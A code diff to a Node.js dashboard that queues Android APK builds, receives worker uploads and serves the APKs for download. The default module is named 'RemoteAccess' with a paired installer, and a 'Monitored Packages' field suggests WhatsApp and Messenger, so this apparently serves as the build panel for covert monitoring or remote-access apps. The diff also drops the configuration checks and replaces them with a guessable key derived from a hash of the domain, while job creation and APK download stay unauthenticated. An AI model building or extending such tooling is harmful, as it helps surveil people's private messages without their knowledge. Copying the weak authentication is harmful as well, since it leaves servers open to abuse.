@@ -29,21 +29,28 @@ function deriveBuildUrl() {
   ];
   for (const k of directHosts) {
     const u = normalizeUrl(process.env[k]);
-    if (u) return u;
+    if (u) { BUILD_URL_EXPLICIT = true; return u; }
   }
 
   if (process.env.REPLIT_DOMAINS) {
     const u = normalizeUrl(process.env.REPLIT_DOMAINS.split(',')[0]);
-    if (u) return u;
+    if (u) { BUILD_URL_EXPLICIT = true; return u; }
   }
-  if (process.env.HEROKU_APP_NAME) return `https://${process.env.HEROKU_APP_NAME}.herokuapp.com`;
-  if (process.env.FLY_APP_NAME)    return `https://${process.env.FLY_APP_NAME}.fly.dev`;
+  if (process.env.HEROKU_APP_NAME) { BUILD_URL_EXPLICIT = true; return `https://${process.env.HEROKU_APP_NAME}.herokuapp.com`; }
+  if (process.env.FLY_APP_NAME) { BUILD_URL_EXPLICIT = true; return `https://${process.env.FLY_APP_NAME}.fly.dev`; }
 
+  // Self-hosted: worker points to this server itself
+  BUILD_URL_EXPLICIT = true;
   return `http://localhost:${PORT}`;
 }
 
 const BUILD_URL = deriveBuildUrl();
-const BUILD_API_KEY = process.env.BUILD_API_KEY || '';
+
+// Use provided API key or generate a stable internal one for self-hosted mode
+const INTERNAL_API_KEY = 'internal-build-key-' + require('crypto').createHash('sha1')
+  .update(process.env.REPLIT_DEV_DOMAIN || 'local').digest('hex').slice(0, 16);
+const BUILD_API_KEY = process.env.BUILD_API_KEY || INTERNAL_API_KEY;
+
 const MAX_PARALLEL = parseInt(process.env.BUILD_MAX_PARALLEL || '5', 10) || 5;
 
 const state = {
@@ -52,23 +59,27 @@ const state = {
   workerAlive: false,
   workerStatus: 'starting',
   lastPollAt: null,
-  // Now a map of job-id -> currently-building job. Up to MAX_PARALLEL entries.
   currentJobs: {},
   recentJobs: [],
   recentLogs: [],
   buildUrl: BUILD_URL,
-  hasApiKey: Boolean(BUILD_API_KEY),
+  hasApiKey: Boolean(process.env.BUILD_API_KEY),
   maxParallel: MAX_PARALLEL,
 };
 
+// Job queue: jobs waiting to be picked up by the worker
+const jobQueue = [];
+
 const MAX_RECENT_JOBS = 30;
-const MAX_RECENT_LOGS = 400;
+const MAX_RECENT_LOGS = 2000;
 
 function pushLog(line) {
   state.recentLogs.push({ t: Date.now(), line });
   if (state.recentLogs.length > MAX_RECENT_LOGS) {
     state.recentLogs.splice(0, state.recentLogs.length - MAX_RECENT_LOGS);
   }
+  // Always mirror to process stdout so it appears in the system console
+  process.stdout.write('[build] ' + line + '\n');
 }
 
 function finishJob(jobId, status, error) {
@@ -98,6 +109,7 @@ function ensureJob(jobId, accessId) {
       installer: null,
       monitored: null,
       startedAt: Date.now(),
+      logs: [],
     };
     state.workerStatus = 'building';
   } else if (accessId && !state.currentJobs[jobId].accessId) {
@@ -106,9 +118,6 @@ function ensureJob(jobId, accessId) {
   return state.currentJobs[jobId];
 }
 
-// Lines from the worker now look like:  "[<JOB_ID>] <message>"
-// when the worker is running concurrent jobs. Untagged lines are global
-// worker output (startup banner, slot accounting, etc.).
 const TAG_RE = /^\[([A-Za-z0-9_-]+)\]\s?(.*)$/;
 
 function parseLine(raw) {
@@ -120,12 +129,10 @@ function parseLine(raw) {
     return;
   }
 
-  // Pull off the per-job tag, if present.
   const tagMatch = stripped.match(TAG_RE);
   const taggedJobId = tagMatch ? tagMatch[1] : null;
   const line = tagMatch ? tagMatch[2] : stripped;
 
-  // "📥 Job <id> accepted for <access> (slots in use: x/y)"
   let m = line.match(/^\s*📥\s*Job\s+(\S+)\s+accepted\s+for\s+(\S+)/);
   if (m) {
     ensureJob(m[1], m[2]);
@@ -133,7 +140,6 @@ function parseLine(raw) {
     return;
   }
 
-  // "▶ Job <id> — Access <access>"
   m = line.match(/^\s*▶\s*Job\s+(\S+)\s+—\s+Access\s+(\S+)/);
   if (m) {
     ensureJob(m[1], m[2]);
@@ -141,9 +147,6 @@ function parseLine(raw) {
     return;
   }
 
-  // Per-job metadata lines — only act on them if we know which job they belong
-  // to (i.e. they came in tagged). Untagged lines from the legacy single-job
-  // path are attributed to the most-recently-started job for back-compat.
   const targetJobId = taggedJobId || newestJobId();
 
   m = line.match(/^\s*Module:\s+(.+)$/);
@@ -164,7 +167,6 @@ function parseLine(raw) {
     return;
   }
 
-  // Success / failure terminators emitted from the per-job subshell.
   m = line.match(/✅\s*Job\s+(\S+)\s+succeeded/);
   if (m) { finishJob(m[1], 'success', null); return; }
 
@@ -182,17 +184,6 @@ function newestJobId() {
 function startWorker() {
   state.workerStartedAt = Date.now();
   state.workerStatus = 'starting';
-
-  if (!BUILD_API_KEY) {
-    state.workerStatus = 'misconfigured';
-    pushLog('[worker not started: BUILD_API_KEY missing]');
-    return;
-  }
-  if (!BUILD_URL_EXPLICIT) {
-    state.workerStatus = 'misconfigured';
-    pushLog(`[worker not started: BUILD_URL not set — auto-derived to ${BUILD_URL} which is this worker itself. Set BUILD_URL to your dashboard URL.]`);
-    return;
-  }
 
   const env = {
     ...process.env,
@@ -218,7 +209,6 @@ function startWorker() {
     while ((idx = stdoutBuf.indexOf('\n')) !== -1) {
       const line = stdoutBuf.slice(0, idx);
       stdoutBuf = stdoutBuf.slice(idx + 1);
-      process.stdout.write(line + '\n');
       parseLine(line);
     }
   });
@@ -229,7 +219,6 @@ function startWorker() {
     while ((idx = stderrBuf.indexOf('\n')) !== -1) {
       const line = stderrBuf.slice(0, idx);
       stderrBuf = stderrBuf.slice(idx + 1);
-      process.stderr.write(line + '\n');
       parseLine(line);
     }
   });
@@ -238,13 +227,14 @@ function startWorker() {
     state.workerAlive = false;
     state.workerStatus = 'restarting';
     pushLog(`[worker exited code=${code} signal=${signal}, restarting in 3s]`);
-    // Mark every in-flight job as failed; the worker process is gone.
     for (const jid of Object.keys(state.currentJobs)) {
       finishJob(jid, 'failed', `worker exited (code=${code})`);
     }
     setTimeout(startWorker, 3000);
   });
 }
+
+// ── Helpers ────────────────────────────────────────────────────────────────
 
 function fmtDuration(ms) {
   if (ms == null) return '—';
@@ -261,6 +251,29 @@ function fmtTime(t) {
   if (!t) return '—';
   return new Date(t).toLocaleString();
 }
+
+function esc(s) {
+  return String(s ?? '').replace(/[&<>"']/g, c => (
+    { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]
+  ));
+}
+
+function readBody(req) {
+  return new Promise((resolve, reject) => {
+    const chunks = [];
+    req.on('data', c => chunks.push(c));
+    req.on('end', () => resolve(Buffer.concat(chunks)));
+    req.on('error', reject);
+  });
+}
+
+function checkAuth(req) {
+  const auth = req.headers['authorization'] || '';
+  const token = auth.startsWith('Bearer ') ? auth.slice(7) : auth;
+  return token === BUILD_API_KEY;
+}
+
+// ── Web UI ─────────────────────────────────────────────────────────────────
 
 function renderPage() {
   const uptimeMs = state.workerStartedAt ? Date.now() - state.workerStartedAt : 0;
@@ -290,6 +303,7 @@ function renderPage() {
           <div><span class="k">Installer</span><span class="v">${esc(cur.installer || '—')}</span></div>
           ${cur.monitored ? `<div><span class="k">Monitored</span><span class="v">${esc(cur.monitored)}</span></div>` : ''}
         </div>
+        ${cur.logs && cur.logs.length > 0 ? `<pre class="logs">${cur.logs.slice(-50).map(l => `<div class="log">${esc(l)}</div>`).join('')}</pre>` : ''}
       </div>`).join('');
 
   const recentBlock = state.recentJobs.length === 0
@@ -307,6 +321,27 @@ function renderPage() {
             <div><span class="k">Installer</span><span class="v">${esc(j.installer || '—')}</span></div>
             <div><span class="k">Finished</span><span class="v">${esc(fmtTime(j.finishedAt))}</span></div>
             ${j.error ? `<div><span class="k">Error</span><span class="v err">${esc(j.error)}</span></div>` : ''}
+          </div>
+        </div>`).join('');
+
+  const logsBlock = state.recentLogs.length === 0
+    ? `<div class="empty">No log lines yet.</div>`
+    : `<pre class="logs">${state.recentLogs.slice(-200).map(e =>
+        `<div class="log">${esc(e.line)}</div>`
+      ).join('')}</pre>`;
+
+  const queueBlock = jobQueue.length === 0
+    ? `<div class="empty">Queue is empty.</div>`
+    : jobQueue.map(j => `
+        <div class="job">
+          <div class="job-head">
+            <span class="badge badge-blue">Queued</span>
+            <span class="job-id">Job ${esc(j.id)}</span>
+            <span class="muted">Access ${esc(j.accessId || '—')}</span>
+          </div>
+          <div class="job-body">
+            <div><span class="k">Module</span><span class="v">${esc(j.moduleName || '—')} (${esc(j.modulePackage || '—')})</span></div>
+            <div><span class="k">Installer</span><span class="v">${esc(j.installerName || '—')} (${esc(j.installerPackage || '—')})</span></div>
           </div>
         </div>`).join('');
 
@@ -348,10 +383,18 @@ function renderPage() {
   .job-body .v.err { color: #fca5a5; }
   .muted { color: #6b7280; }
   .empty { color: #6b7280; font-style: italic; padding: 8px 0; }
-  pre.logs { margin: 0; max-height: 320px; overflow: auto; background: #07090b;
+  pre.logs { margin: 8px 0 0; max-height: 320px; overflow: auto; background: #07090b;
              border: 1px solid #1f242b; border-radius: 8px; padding: 10px 12px;
              font: 12px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace; color: #cbd5e1; }
   .log { white-space: pre-wrap; word-break: break-all; }
+  form.start-form { display: grid; grid-template-columns: 1fr 1fr; gap: 10px 16px; }
+  form.start-form label { display: flex; flex-direction: column; gap: 4px; font-size: 12px; color: #9ca3af; }
+  form.start-form input { background: #0b0d10; border: 1px solid #2d3748; border-radius: 6px; padding: 7px 10px;
+                          color: #e5e7eb; font-size: 13px; width: 100%; }
+  form.start-form input:focus { outline: none; border-color: #3b82f6; }
+  .btn { margin-top: 12px; padding: 8px 20px; background: #3b82f6; color: #fff; border: none;
+         border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; }
+  .btn:hover { background: #2563eb; }
 </style>
 </head>
 <body>
@@ -366,9 +409,29 @@ function renderPage() {
       <div><span class="k">Worker PID</span><span class="v">${state.workerPid ?? '—'}</span></div>
       <div><span class="k">Uptime</span><span class="v">${fmtDuration(uptimeMs)}</span></div>
       <div><span class="k">Concurrency</span><span class="v">${curList.length} / ${state.maxParallel} slot(s) in use</span></div>
+      <div><span class="k">Queue</span><span class="v">${jobQueue.length} job(s) waiting</span></div>
       <div><span class="k">Build URL</span><span class="v">${esc(state.buildUrl)}</span></div>
-      <div><span class="k">API Key</span><span class="v">${state.hasApiKey ? 'configured' : 'missing'}</span></div>
+      <div><span class="k">API Key</span><span class="v">${process.env.BUILD_API_KEY ? 'configured' : 'internal (auto)'}</span></div>
     </div>
+  </div>
+
+  <div class="card">
+    <h2>Start a Build Job</h2>
+    <form class="start-form" method="POST" action="/api/build/start">
+      <label>Job ID (leave blank to auto-generate)<input name="id" placeholder="e.g. job-001" /></label>
+      <label>Access ID *<input name="accessId" placeholder="e.g. ACC-1234" required /></label>
+      <label>Module Name<input name="moduleName" placeholder="My App" /></label>
+      <label>Module Package<input name="modulePackage" placeholder="com.example.myapp" /></label>
+      <label>Installer Name<input name="installerName" placeholder="My Installer" /></label>
+      <label>Installer Package<input name="installerPackage" placeholder="com.example.installer" /></label>
+      <label style="grid-column:1/-1">Monitored Packages (comma-separated)<input name="monitoredPackages" placeholder="com.whatsapp,com.facebook.orca" /></label>
+      <button type="submit" class="btn" style="grid-column:1/-1">Queue Build</button>
+    </form>
+  </div>
+
+  <div class="card">
+    <h2>Queue (${jobQueue.length})</h2>
+    ${queueBlock}
   </div>
 
   <div class="card">
@@ -380,24 +443,34 @@ function renderPage() {
     <h2>Recent Jobs (${state.recentJobs.length})</h2>
     ${recentBlock}
   </div>
+
+  <div class="card">
+    <h2>Worker Logs (last 200 lines)</h2>
+    ${logsBlock}
+  </div>
 </div>
+<script>
+  // Auto-scroll log panes to bottom on load
+  document.querySelectorAll('pre.logs').forEach(el => { el.scrollTop = el.scrollHeight; });
+</script>
 </body>
 </html>`;
 }
 
-function esc(s) {
-  return String(s ?? '').replace(/[&<>"']/g, c => (
-    { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]
-  ));
-}
+// ── HTTP server ────────────────────────────────────────────────────────────
 
-const server = http.createServer((req, res) => {
-  if (req.url === '/healthz') {
+const server = http.createServer(async (req, res) => {
+  const url = req.url.split('?')[0];
+
+  // Health check
+  if (url === '/healthz') {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end('ok');
     return;
   }
-  if (req.url === '/api/status') {
+
+  // ── Status API ───────────────────────────────────────────────────────────
+  if (url === '/api/status') {
     res.writeHead(200, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({
       workerAlive: state.workerAlive,
@@ -407,30 +480,194 @@ const server = http.createServer((req, res) => {
       buildUrl: state.buildUrl,
       hasApiKey: state.hasApiKey,
       maxParallel: state.maxParallel,
+      queueLength: jobQueue.length,
       currentJobs: state.currentJobs,
       recentJobs: state.recentJobs,
     }, null, 2));
     return;
   }
-  if (req.url === '/api/build/worker/poll' && req.method === 'GET') {
-    // For testing, return a dummy job
+
+  // ── Start a build job (from form or API) ─────────────────────────────────
+  if (url === '/api/build/start' && req.method === 'POST') {
+    let body;
+    try { body = await readBody(req); } catch { body = Buffer.from(''); }
+
+    let data = {};
+    const ct = req.headers['content-type'] || '';
+    if (ct.includes('application/json')) {
+      try { data = JSON.parse(body.toString()); } catch {}
+    } else {
+      // form-urlencoded
+      for (const pair of body.toString().split('&')) {
+        const [k, v] = pair.split('=').map(s => decodeURIComponent(s.replace(/\+/g, ' ')));
+        if (k) data[k] = v || '';
+      }
+    }
+
+    const jobId = (data.id || '').trim() || 'job-' + Date.now();
+    const accessId = (data.accessId || '').trim();
+    if (!accessId) {
+      if (req.headers.accept && req.headers.accept.includes('text/html')) {
+        res.writeHead(302, { Location: '/?error=missing-access-id' });
+        res.end();
+      } else {
+        res.writeHead(400, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: false, error: 'accessId is required' }));
+      }
+      return;
+    }
+
     const job = {
-      id: 'test-job-' + Date.now(),
-      accessId: 'TEST-123',
-      moduleName: 'Test Module',
-      modulePackage: 'com.test.module',
-      installerName: 'Test Installer',
-      installerPackage: 'com.test.installer',
-      monitoredPackages: 'com.example.app'
+      id: jobId,
+      accessId,
+      moduleName: (data.moduleName || '').trim() || 'RemoteAccess',
+      modulePackage: (data.modulePackage || '').trim() || 'com.task.tusker',
+      installerName: (data.installerName || '').trim() || 'Installer',
+      installerPackage: (data.installerPackage || '').trim() || 'com.task.tusker.installer',
+      monitoredPackages: (data.monitoredPackages || '').trim() || '',
     };
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({
-      success: true,
-      hasJob: true,
-      job: job
-    }));
+
+    jobQueue.push(job);
+    console.log(`[queue] Job ${job.id} queued for ${job.accessId} (queue length: ${jobQueue.length})`);
+
+    if (req.headers.accept && req.headers.accept.includes('text/html')) {
+      res.writeHead(302, { Location: '/' });
+      res.end();
+    } else {
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ success: true, jobId: job.id, queued: true }));
+    }
     return;
   }
+
+  // ── Worker poll endpoint (called by build.sh --worker) ───────────────────
+  if (url === '/api/build/worker/poll' && req.method === 'GET') {
+    if (!checkAuth(req)) {
+      res.writeHead(401, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ success: false, error: 'unauthorized' }));
+      return;
+    }
+    state.lastPollAt = Date.now();
+    if (jobQueue.length > 0) {
+      const job = jobQueue.shift();
+      console.log(`[poll] Dispatching job ${job.id} to worker`);
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ success: true, hasJob: true, job }));
+    } else {
+      // Hold connection briefly (short-poll), then return no job
+      await new Promise(r => setTimeout(r, 5000));
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ success: true, hasJob: false }));
+    }
+    return;
+  }
+
+  // ── Worker log streaming endpoint ─────────────────────────────────────────
+  // Called by send_logs.py in build.sh with batches of build output lines
+  const logMatch = url.match(/^\/api\/build\/worker\/log\/([A-Za-z0-9_-]+)$/);
+  if (logMatch && req.method === 'POST') {
+    if (!checkAuth(req)) {
+      res.writeHead(401); res.end(); return;
+    }
+    const jobId = logMatch[1];
+    let body;
+    try { body = await readBody(req); } catch { body = Buffer.from('{}'); }
+
+    let lines = [];
+    try {
+      const parsed = JSON.parse(body.toString());
+      lines = Array.isArray(parsed.lines) ? parsed.lines : [];
+    } catch {}
+
+    const job = state.currentJobs[jobId];
+    for (const line of lines) {
+      const stripped = String(line).replace(/\x1b\[[0-9;]*m/g, '');
+      // Store in per-job log buffer (keep last 500 lines per job)
+      if (job) {
+        if (!job.logs) job.logs = [];
+        job.logs.push(stripped);
+        if (job.logs.length > 500) job.logs.splice(0, job.logs.length - 500);
+      }
+      // Write to console so it appears in the system workflow logs
+      process.stdout.write(`[job:${jobId}] ${stripped}\n`);
+    }
+
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ ok: true, received: lines.length }));
+    return;
+  }
+
+  // ── Worker APK upload endpoint ────────────────────────────────────────────
+  const uploadMatch = url.match(/^\/api\/build\/worker\/upload\/([A-Za-z0-9_-]+)\/(module|installer)$/);
+  if (uploadMatch && req.method === 'POST') {
+    if (!checkAuth(req)) {
+      res.writeHead(401); res.end(); return;
+    }
+    const jobId = uploadMatch[1];
+    const kind = uploadMatch[2];
+    let body;
+    try { body = await readBody(req); } catch { body = Buffer.from(''); }
+
+    const fs = require('fs');
+    const outDir = path.join(__dirname, 'apk-output', jobId);
+    fs.mkdirSync(outDir, { recursive: true });
+    const fname = kind === 'module' ? 'Module.apk' : 'Installer.apk';
+    const outPath = path.join(outDir, fname);
+    fs.writeFileSync(outPath, body);
+    console.log(`[upload] Job ${jobId} — ${kind} APK saved (${body.length} bytes) → ${outPath}`);
+
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ ok: true, kind, size: body.length }));
+    return;
+  }
+
+  // ── Worker job completion endpoint ────────────────────────────────────────
+  const completeMatch = url.match(/^\/api\/build\/worker\/complete\/([A-Za-z0-9_-]+)$/);
+  if (completeMatch && req.method === 'POST') {
+    if (!checkAuth(req)) {
+      res.writeHead(401); res.end(); return;
+    }
+    const jobId = completeMatch[1];
+    let body;
+    try { body = await readBody(req); } catch { body = Buffer.from('{}'); }
+
+    let data = {};
+    try { data = JSON.parse(body.toString()); } catch {}
+
+    const success = data.success === true || data.success === '1' || data.success === 1;
+    const error = data.error || null;
+    finishJob(jobId, success ? 'success' : 'failed', error);
+    console.log(`[complete] Job ${jobId} — ${success ? 'SUCCESS' : 'FAILED'}${error ? ' — ' + error : ''}`);
+
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ ok: true }));
+    return;
+  }
+
+  // ── APK download ─────────────────────────────────────────────────────────
+  const apkMatch = url.match(/^\/apk\/([A-Za-z0-9_-]+)\/(module|installer)$/);
+  if (apkMatch && req.method === 'GET') {
+    const jobId = apkMatch[1];
+    const kind = apkMatch[2];
+    const fname = kind === 'module' ? 'Module.apk' : 'Installer.apk';
+    const fpath = path.join(__dirname, 'apk-output', jobId, fname);
+    const fs = require('fs');
+    if (!fs.existsSync(fpath)) {
+      res.writeHead(404, { 'Content-Type': 'text/plain' });
+      res.end('APK not found');
+      return;
+    }
+    const data = fs.readFileSync(fpath);
+    res.writeHead(200, {
+      'Content-Type': 'application/vnd.android.package-archive',
+      'Content-Disposition': `attachment; filename="${fname}"`,
+      'Content-Length': data.length,
+    });
+    res.end(data);
+    return;
+  }
+
+  // ── Default: web dashboard ────────────────────────────────────────────────
   res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
   res.end(renderPage());
 });
@@ -438,7 +675,7 @@ const server = http.createServer((req, res) => {
 server.listen(PORT, '0.0.0.0', () => {
   console.log(`==> Status server listening on :${PORT}`);
   console.log(`==> BUILD_URL: ${BUILD_URL}`);
-  console.log(`==> BUILD_API_KEY: ${BUILD_API_KEY ? 'set' : 'MISSING'}`);
+  console.log(`==> BUILD_API_KEY: ${process.env.BUILD_API_KEY ? 'set (from env)' : 'auto-generated (internal)'}`);
   console.log(`==> Concurrency cap: ${MAX_PARALLEL} job(s) in parallel`);
   startWorker();
 });
